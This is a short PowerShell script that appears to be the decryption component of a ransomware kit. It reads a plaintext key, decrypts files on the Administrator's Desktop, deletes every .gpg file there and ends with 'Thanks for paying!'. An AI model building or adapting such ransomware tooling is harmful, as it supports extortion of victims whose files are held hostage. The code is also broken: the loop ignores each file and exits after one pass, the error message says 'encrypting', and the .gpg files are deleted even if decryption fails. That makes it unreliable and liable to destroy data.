#Decryption

# Set location of Encrypted file list
$FilesToDecrypt = Get-Content -Path encryptedfiles.txt

# Set location of cleartext symmetric key
$SMEM = Get-Content -Path SMEM.txt

# Decrypt files
ForEach ($file in $FilesToDecrypt)
    {
        try { Remove-Encryption -FolderPath C:\Users\Administrator\Desktop -Password $SMEM }
        catch {"Failure encrypting"}
        break
        }

# Remove all .gpg encrypted files
Get-ChildItem -Path 'C:\Users\Administrator\Desktop\' *.gpg | foreach { Remove-Item -Path $_.FullName }

Write-Host("Your files have been decrypted! Thanks for paying!")
